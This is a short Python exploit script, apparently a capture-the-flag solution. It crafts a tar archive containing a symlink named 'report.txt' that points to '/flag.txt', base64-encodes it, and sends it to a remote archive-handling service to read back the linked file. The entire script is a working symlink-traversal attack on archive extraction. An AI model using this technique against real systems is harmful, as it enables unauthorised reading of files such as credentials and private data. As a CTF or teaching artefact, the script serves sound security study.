#!/usr/bin/env python3

import base64
import io
import socket
import sys
import tarfile


output = io.BytesIO()
with tarfile.open(fileobj=output, mode="w") as archive:
    report = tarfile.TarInfo("report.txt")
    report.type = tarfile.SYMTYPE
    report.linkname = "/flag.txt"
    archive.addfile(report)

payload = base64.b64encode(output.getvalue()[: 3 * tarfile.BLOCKSIZE])

if len(sys.argv) == 1:
    print(payload.decode())
    raise SystemExit
if len(sys.argv) != 3:
    raise SystemExit(f"usage: {sys.argv[0]} [host port]")

with socket.create_connection((sys.argv[1], int(sys.argv[2]))) as sock:
    banner = b""
    while b"archive> " not in banner:
        banner += sock.recv(4096)
    sock.sendall(payload + b"\n")
    while data := sock.recv(4096):
        sys.stdout.buffer.write(data)
